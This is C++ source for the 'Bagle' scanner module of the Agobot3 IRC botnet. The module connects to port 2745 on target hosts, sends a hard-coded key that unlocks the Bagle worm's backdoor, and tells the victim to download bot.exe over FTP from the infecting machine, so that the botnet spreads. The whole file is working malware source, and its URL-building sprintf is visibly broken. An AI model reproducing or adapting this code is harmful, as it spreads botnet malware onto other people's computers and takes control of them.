/*$T baglescanner.cpp GC 1.138 03/07/04 18:10:08 */

/*
 * Agobot3 - a modular IRC bot for Win32 / Linux Copyright (c) 2003 Ago All rights
 * reserved. This is private software, you may redistribute it under the terms of
 * the APL(Ago's Private License) which follows: Redistribution and use in binary
 * forms, with or without modification, are permitted provided that the following
 * conditions are met: 1. The name of the author may not be used to endorse or
 * promote products derived from this software without specific prior written
 * permission. 2. The binary may not be sold and/or given away for free. 3. The
 * licensee may only create binaries for his own usage, not for any third parties.
 * Redistribution and use in source forms, with or without modification, are not
 * permitted. THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
 * EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT
 * OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING
 * IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
 * OF SUCH DAMAGE.
 */
#include "main.h"
#include "mainctrl.h"
#include "utility.h"

class CScannerBagle :
	public CScannerBase
{
public:
	CScannerBagle(void);
	virtual ~CScannerBagle() throw() { }
	bool	Exploit(void);
};

/*
 * Bagle.* Scanner starts here, scans for the bagle worm and attempts to use the
 * built in backdoor. thegeek.
 */
#define BAGLE_DEFAULT_PORT	2745

/*
 * Hash/key that the bagle worm uses, must be hashed to 0x3e7406b1 in the
 * hashcheck it uses. Took me _hours_ to break;)
 */
char	bagle_auth[] = "\x43\xFF\xFF\xFF\x30\x30\x30\x01\x0A\x1F\x2B\x28\x2B\xA1\x32\x01";
char	spreadurl[] = "URL";


CScannerBagle::CScannerBagle(void)
{
	m_szType = "CScannerBagle";
	m_sScannerName.Assign("Bagle");
}

/*
 =======================================================================================================================
 =======================================================================================================================
 */
bool CScannerBagle::Exploit(void)
{
	/*~~~~~~~~~~~~~~~~~~~*/
	char	szRecvBuf[128];
	/*~~~~~~~~~~~~~~~~~~~*/

	if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost)) return false;

	/* Connect to the server */
	if(!m_sSocket.Connect(m_sSocket.m_szHost, BAGLE_DEFAULT_PORT))	/* Connect failed, exit */
	{
		return false;
	}

	/* Send the bagle header */
	if(!m_sSocket.Write(bagle_auth, sizeof(bagle_auth) - 1))
	{
		m_sSocket.Disconnect();
		return false;
	}

	/*
	 * Receive. £
	 * TODO: could add some checks here.
	 */
	if(!m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 128))
	{
		m_sSocket.Disconnect();
		return false;
	}

	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	int iPort = g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue;
	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

	sprintf(spreadurl, "ftp:////%s:%s//bot.exe", g_pMainCtrl->m_cIRC.m_sLocalIp.CStr(), iPort);

	/* Send the url to download file from, use built in ftp. */
	if(!m_sSocket.Write(spreadurl, sizeof(spreadurl) - 1))
	{
		m_sSocket.Disconnect();
		return false;
	}

	m_sSocket.Disconnect();
	return false;
}

REGSCANNER(Bagle_2745, Bagle, 2745, true, true)
